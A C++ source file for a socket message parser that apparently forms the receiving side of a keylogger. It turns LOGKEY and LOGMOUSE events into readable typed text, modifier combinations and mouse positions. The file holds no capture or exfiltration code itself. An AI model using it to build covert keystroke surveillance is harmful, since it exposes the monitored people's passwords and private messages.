#include                          <iostream>
#include                          <iterator>
#include                          <chrono>
#include                          <sstream>
#include                          <codecvt>
#include                          <locale>
#include                          "Parser.hpp"

Parser::Parser() {
  this->actions.push_back(std::make_tuple("CONNECT", &Parser::eventConnect));
  this->actions.push_back(std::make_tuple("LOGKEY", &Parser::eventLogKey));
  this->actions.push_back(std::make_tuple("LOGMOUSE", &Parser::eventLogMouse));
  this->actions.push_back(std::make_tuple("STATUS", &Parser::eventStatus));
  this->modifier[16] = "Shift";
  this->modifier[17] = "Ctrl";
  this->modifier[18] = "Alt";
  this->responseType = Parser::NO_RES;
}

Parser::~Parser() {}

boost::shared_ptr<Parser>         Parser::create() {
  return boost::shared_ptr<Parser>(new Parser());
}

const std::string&                Parser::getResponse() {
  return this->res;
}

void                              Parser::makeMessageResponse() {
  if (this->group.str().length() > 0) {
    this->responseType = Parser::MESSAGE;
    this->res = this->group.str();
    this->group.str(std::string());
  } else {
    this->responseType = Parser::NO_RES;
  }
}

void                              Parser::eventStatus() {
  std::stringstream               s;
  for (auto it: this->getter)
    s << it;
  this->res = s.str();
  this->responseType = Parser::STATUS;
}

void                              Parser::eventLogMouse() {
  std::stringstream               s;

  if (this->getter.size() == 4) {
    s << "Mouse moved to x: " << this->getter[1] << " y: " << this->getter[2];
  } else if (this->getter.size() == 5) {
    s << "Mouse clicked with " << this->getter[1] << " at x: " << this->getter[2] << " y: " << this->getter[3];
  }
  this->res = s.str();
  this->responseType = Parser::MOUSE;
}

void                              Parser::eventLogKey() {
  if (std::stoi(this->getter[1]) == 13) {
    this->makeMessageResponse();
  } else {
    unsigned long res = std::stoul(this->getter[1], NULL, 10);
    std::wstring_convert<std::codecvt_utf8<char32_t>, char32_t> convert;
    if (this->getter.size() == 5) {
      this->group << this->modifier[std::stoi(this->getter[2])] << "+" << convert.to_bytes(res);
    } else {
      this->group << convert.to_bytes(res);
    }
  }
}

void                              Parser::eventConnect() {
  this->res = this->getter[1];
  this->responseType = Parser::CONNECT;
}

void                              Parser::manageEvent() {
  for (auto it: this->actions)
    if (std::get<0>(it) == this->getter[0])
      (this->*(std::get<1>(it)))();
}

void                              Parser::receivePropsFromSocket(const std::string& str) {
  std::string                     buf;
  std::stringstream               ss(str);

  this->getter.clear();
  while (ss >> buf)
    this->getter.push_back(buf);
}
